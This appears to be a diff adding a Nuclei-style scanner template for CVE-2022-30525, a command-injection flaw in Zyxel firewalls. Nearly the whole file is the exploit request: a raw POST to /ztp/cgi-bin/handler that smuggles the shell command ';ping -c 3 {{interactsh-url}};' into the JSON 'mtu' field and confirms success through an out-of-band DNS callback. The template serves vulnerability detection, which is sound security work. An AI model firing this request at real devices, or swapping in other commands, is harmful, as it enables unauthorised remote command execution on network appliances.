@@ -1,0 +1,29 @@
+id: CVE-2022-30525
+
+info:
+  name: cx
+  author: remote
+  severity: high
+  tags: CVE-2022-30525
+  reference: CVE-2022-30525
+
+requests:
+  - raw:
+      - |
+        POST /ztp/cgi-bin/handler HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json; charset=utf-8
+        
+        {"command": "setWanPortSt","proto": "dhcp","port": "1270","vlan_tagged": "1270","vlanid": "1270","mtu": "{{exploit}}","data":""}
+        
+        
+    payloads:
+      exploit:
+        - ";ping -c 3 {{interactsh-url}};"
+    attack: pitchfork
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: dns
+        words:
+          - "dns"
